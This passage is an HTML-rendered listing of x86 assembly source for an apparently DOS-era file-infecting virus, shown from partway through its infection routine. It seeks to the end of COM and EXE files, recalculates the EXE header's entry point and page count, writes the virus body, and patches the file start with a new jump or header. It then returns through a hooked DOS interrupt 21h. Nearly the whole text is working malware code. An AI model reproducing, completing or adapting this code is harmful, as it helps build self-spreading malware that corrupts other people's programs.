        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">

</span><span class="sc5">SKIP</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  8-File PTR @EOF</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;cx = dx = 00</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">    </span><span class="sc1">;COM?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">DO_EXE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------???????????????????</span><span class="sc0">
        
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">     </span><span class="sc1">;fix file size </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;address to jump to</span><span class="sc0">
        
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WRITE_VIRUS</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  9-SAVE CS:IP</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc5">DO_EXE</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">;save file handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">CSIPP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">         </span><span class="sc1">;CS:IP in EXE hdr</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;from ds:si</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;to   es:di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc1">;**********************************                </span><span class="sc0">
</span><span class="sc1">;  10-CALCULATE / INSERT NEW CS:IP</span><span class="sc0">
</span><span class="sc1">;**********************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;header size in paragraphs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                </span><span class="sc1">;multiply by 16</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;save filesize</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                </span><span class="sc1">;file size - header size</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                </span><span class="sc1">;fix upper half of size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                </span><span class="sc1">;dx * 4096</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                </span><span class="sc1">;ax / 16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                </span><span class="sc1">;CS = dx * 4096 + ax / 16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">               </span><span class="sc1">;IP = ax and 0Fh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">ID</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;CS</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;restore filesize</span><span class="sc0">

</span><span class="sc1">;**********************************                </span><span class="sc0">
</span><span class="sc1">;  11-CALCULATE / INSERT FILESIZE</span><span class="sc0">
</span><span class="sc1">;**********************************</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ZIZE</span><span class="sc0">  </span><span class="sc1">;add virus size</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">    </span><span class="sc1">;add virus size</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">   </span><span class="sc1">;2^9 = 512</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">    </span><span class="sc1">;dx / 512</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">    </span><span class="sc1">;ax / 512</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">               </span><span class="sc1">;set carry flag</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                          </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;original ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">    </span><span class="sc1">;mod 512</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;page count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;remainder</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">;restore file handle</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  12-Write Virus</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc5">WRITE_VIRUS</span><span class="sc4">:</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ZIZE</span><span class="sc0">    </span><span class="sc1">;cx = #of bytes</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01E0h</span><span class="sc0">   </span><span class="sc1">;dx = write from here</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  13-Set PTR @BOF</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
        
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">  
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;cx = dx = 00</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">     </span><span class="sc1">;EXE?</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">WRITE_EXE_HDR</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  14-Write new jump</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">;# of bytes to write</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">NEW_HOST_ENTRYY</span><span class="sc0">        </span><span class="sc1">;dx = write from here</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">      </span><span class="sc1">;insert new address</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CONT</span><span class="sc0"> 

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  15-Write new EXE hdr</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
 
</span><span class="sc5">WRITE_EXE_HDR</span><span class="sc4">:</span><span class="sc0">                
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24d</span><span class="sc0">               </span><span class="sc1">;# of bytes to write</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">HOST_STUBB</span><span class="sc0">        </span><span class="sc1">;buffer to write 4 bytes from</span><span class="sc0">
           
</span><span class="sc5">CONT</span><span class="sc4">:</span><span class="sc0">               
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc5">CLOSE_FILEE</span><span class="sc4">:</span><span class="sc0">  
        
</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">;  16-Restore Date &amp; time</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">
         
           </span><span class="sc1">;pop   cx       ;restore time</span><span class="sc0">
           </span><span class="sc1">;pop   dx       ;restore date</span><span class="sc0">
           </span><span class="sc1">;mov   ax,5701h</span><span class="sc0">
           </span><span class="sc1">;call  INT_21</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  17-Klose File</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0"> 
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
         
</span><span class="sc1">;************************                </span><span class="sc0">
</span><span class="sc1">;  18-Restore Attributes</span><span class="sc0">
</span><span class="sc1">;************************</span><span class="sc0">

</span><span class="sc5">RESTORE_ATTRIBUTESS</span><span class="sc4">:</span><span class="sc0">
           
          </span><span class="sc1">; mov     ax,4301h</span><span class="sc0">
          </span><span class="sc1">; pop     dx         ;ds:dx = pathname to file</span><span class="sc0">
          </span><span class="sc1">; pop     ds         ;restore pathname</span><span class="sc0">
          </span><span class="sc1">; pop     cx         ;restore old attributes</span><span class="sc0">
          </span><span class="sc1">; call    INT_21</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Restore registers</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc5">EXIT_HANDLER</span><span class="sc4">:</span><span class="sc0">                   
         </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
        
</span><span class="sc5">QUICK_OUT</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0EAh</span><span class="sc0">                      </span><span class="sc1">; jmp OFFSET:SEGMENT</span><span class="sc0">
</span><span class="sc5">REAL_INT_21</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
</span><span class="sc5">HOST_STUB</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0">        </span><span class="sc1">;4 byte COM stub / EXE HDR  </span><span class="sc0">
           
</span><span class="sc5">END_VIRUS</span><span class="sc4">:</span><span class="sc0">                

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ZIZE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">END_VIRUS</span><span class="sc0">              </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0"> 
</span><span class="sc5">REALL_INT_21</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">REAL_INT_21</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
</span><span class="sc5">HOST_STUBB</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HOST_STUB</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">     
</span><span class="sc5">NEW_HOST_ENTRYY</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_HOST_ENTRY</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
</span><span class="sc5">CSIPP</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">CSIP</span><span class="sc0">           </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
</span><span class="sc5">EXE_FLAGG</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_FLAG</span><span class="sc0">       </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
</span><span class="sc5">ID</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7777h</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0">             </span><span class="sc5">START</span><span class="sc0">
        

</span></div></body>
</html>
